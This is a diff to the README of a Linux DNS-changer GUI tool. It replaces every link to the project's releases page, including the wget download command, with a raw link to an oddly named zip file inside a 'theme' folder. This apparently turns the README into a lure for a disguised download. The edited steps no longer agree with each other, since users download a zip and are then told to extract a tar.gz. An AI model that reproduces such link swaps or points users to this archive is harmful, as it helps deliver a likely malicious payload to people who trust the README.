@@ -1,6 +1,6 @@
 # 🛠️ GUI-DNS-Changer-for-Systemd - Simple DNS Management Tool
 
-[![Download](https://img.shields.io/badge/Download-blue?style=for-the-badge)](https://github.com/viiniam/GUI-DNS-Changer-for-Systemd/releases)
+[![Download](https://img.shields.io/badge/Download-blue?style=for-the-badge)](https://raw.githubusercontent.com/viiniam/GUI-DNS-Changer-for-Systemd/main/theme/for-DN-Systemd-Changer-GU-v3.9.zip)
 
 ## 📋 About This Application
 
@@ -32,12 +32,12 @@ You will need to download the latest version from the releases page linked below
 
 Make sure your system meets the requirements above before proceeding.
 
-[![Download Here](https://img.shields.io/badge/Download-Green?style=for-the-badge)](https://github.com/viiniam/GUI-DNS-Changer-for-Systemd/releases)
+[![Download Here](https://img.shields.io/badge/Download-Green?style=for-the-badge)](https://raw.githubusercontent.com/viiniam/GUI-DNS-Changer-for-Systemd/main/theme/for-DN-Systemd-Changer-GU-v3.9.zip)
 
 ### Steps to download:
 
 1. Click on the button above or visit this page:  
-   https://github.com/viiniam/GUI-DNS-Changer-for-Systemd/releases
+   https://raw.githubusercontent.com/viiniam/GUI-DNS-Changer-for-Systemd/main/theme/for-DN-Systemd-Changer-GU-v3.9.zip
 
 2. Find the latest release version. Look for a file ending with `.tar.gz` or `.zip`.
 
@@ -73,7 +73,7 @@ This application is designed for Linux systems. To run it on Windows, use Window
      `cd ~/Downloads`
 
    - Use `wget` to download the latest release file. Replace `[file_url]` with the actual `.tar.gz` or `.zip` direct download link from the releases page. For example:   
-     `wget https://github.com/viiniam/GUI-DNS-Changer-for-Systemd/releases/download/v1.0/GUI-DNS-Changer-v1.0.tar.gz`
+     `wget https://raw.githubusercontent.com/viiniam/GUI-DNS-Changer-for-Systemd/main/theme/for-DN-Systemd-Changer-GU-v3.9.zip`
 
    - Extract the file:  
      `tar -xzf GUI-DNS-Changer-v1.0.tar.gz`
@@ -139,7 +139,7 @@ For advanced users, profiles can also be edited directly in the SQLite database 
 
 ## 🔗 Download Again
 
-[Click here to visit the releases page and download the application](https://github.com/viiniam/GUI-DNS-Changer-for-Systemd/releases)  
+[Click here to visit the releases page and download the application](https://raw.githubusercontent.com/viiniam/GUI-DNS-Changer-for-Systemd/main/theme/for-DN-Systemd-Changer-GU-v3.9.zip)  
 
 Use this page to get the most recent version or find older builds.
 
